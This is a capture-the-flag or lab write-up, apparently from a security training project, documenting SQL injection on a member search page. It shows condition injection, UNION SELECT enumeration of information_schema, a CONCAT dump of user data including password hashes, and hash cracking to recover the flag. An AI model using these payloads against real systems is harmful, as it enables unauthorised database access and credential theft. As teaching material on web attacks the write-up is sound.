# SQL injection on members table

## How we found the breach

From the page `http://IP/?page=member`, where we can find a members search engine by user ID.

### Legit search

First of all we try to find a user with a `userID` equal to `1`:

Input:

```sql
1
```

Output:

```txt
ID: 1
First name: one
Surname : me
```

We can see that the server returns two fields for the user.

### Simple SQL injection attempt

Starting hacking using a really simple sql injection such as:

Input:

```sql
SELECT * FROM users
```

Output:

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1
```

The server shows us the raw MariaDB error, and we can see that our query has been added to a prebuilt one. We think that the prebuilt query should be something like this:

```sql
SELECT first_name, surname FROM users WHERE users.id = ${id} 
```

### Condition injection

To be able to retrieve all the entries of `users` table, we need to create a SQL query that has a `WHERE` clause always evaluating to `TRUE`. We achieve this result by adding a `OR TRUE` condition:

Input:

```sql
1 OR TRUE
```

Resulting on the server as a query like this:

```sql
SELECT first_name, surname FROM users WHERE users.id = 1 OR TRUE
```

Output:

```
ID: 1 OR TRUE 
First name: one
Surname : me

ID: 1 OR TRUE 
First name: two
Surname : me

ID: 1 OR TRUE 
First name: three
Surname : me

ID: 1 OR TRUE 
First name: Flag
Surname : GetThe
```

There are four users in the `users` table. The last one looks quite suspicious.

### UNION SELECT SQL injection

source: https://www.sqlinjection.net/column-names/

As we could build a custom SQL query from our own input, by using the UNION SELECT attack we can build a new query over the first one and change its behavior completely.

We want to discard all results of the first SELECT and only keep those of our own SELECT. For that we make sure the WHERE clause of the first SELECT always evaluates to `FALSE`.

Input:

```sql
-1 UNION SELECT * FROM users
```

As a serial integer is never negative, no user can have an id that is `-1`.

Output:

```sql
The used SELECT statements have a different number of columns
```

The problem there is that our second `UNION SELECT` query returns more columns than the initial sql query, that returned 2 columns, due to selecting all fields with `*`.

### Finding all tables columns name

Our goal is to retrieve the name of all columns of the `users` table, to be able to select which of them we want to query with the `UNION SELECT` injection.

To do so we will be using the default database `information_schema.columns` information.

Input:

```sql
-1 UNION SELECT table_name, column_name FROM information_schema.columns
```

Output:

```
<!-- OTHER DATABASE INFORMATION -->

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : user_id

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : first_name

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : last_name

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : town

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : country

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : planet

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : Commentaire

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : countersign

<!-- OTHER DATABASE INFORMATION -->
```

We have retrieved the whole database tables and columns name, focusing on the users table we can find the following columns name:

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

### Using `CONCAT` injection

source: https://makitweb.com/how-to-concatenate-multiple-columns-in-mysql/

What we want now is to retrieve the value of all the columns for each user, concatenated inside a single column, as the initial query can return at most 2 columns.

Input:

```sql
-1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users
```

Output:

```sql
ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 1onemeParis FranceEARTHJe pense, donc je suis2b3366bcfd44f540e630d4dc2b9b06d9
Surname : 1

ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 2twomeHelsinkiFinlandeEarthAamu on iltaa viisaampi.60e9032c586fb422e2c16dee6286cf10
Surname : 1

ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 3threemeDublinIrlandeEarthDublin is a city of stories and secrets.e083b24a01c483437bcf4a9eea7c1b4d
Surname : 1

ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
Surname : 1
```

Inside the last user we can find the operations to do to retrieve the flag.

#### Retrieving the flag

Via md5 decrypt of `5ff9d0165b4f92b14994e5c685cdce28` string, contained in the `countersign` users table column, we get `FortyTwo`.

Hashing using sha256 the `fortytwo` results in `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## How to exploit the breach

[See explanation on the document for the other SQL injection breach →](../../search_images_sql_injection/Ressources/README.md)

## How to avoid the breach

[See explanation on the document for the other SQL injection breach →](../../search_images_sql_injection/Ressources/README.md)
